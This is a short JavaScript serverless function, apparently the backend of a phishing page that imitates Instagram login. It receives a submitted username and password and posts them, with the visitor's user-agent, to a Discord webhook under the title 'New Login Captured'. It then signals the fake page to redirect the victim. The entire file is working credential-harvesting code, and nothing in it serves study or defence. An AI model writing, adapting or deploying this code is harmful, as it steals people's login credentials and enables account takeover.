export default async function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { user, pass } = req.body;
    
    // Read the secret webhook URL from Vercel Settings
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
        return res.status(500).json({ error: 'Server Error: Webhook not set.' });
    }

    // Send the "Rich Embed" to Discord
    await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: "Reel Gateway",
            embeds: [{
                title: "🎣 New Login Captured",
                color: 15548997, // Instagram Red/Pink
                fields: [
                    { name: "👤 User", value: `\`${user}\``, inline: true },
                    { name: "🔑 Pass", value: `\`${pass}\``, inline: true },
                    { name: "📱 Device", value: req.headers['user-agent'], inline: false }
                ],
                footer: { text: "Secure Vercel Gateway" },
                timestamp: new Date()
            }]
        })
    });

    // Respond to the frontend so it knows to redirect
    res.status(200).json({ success: true });
}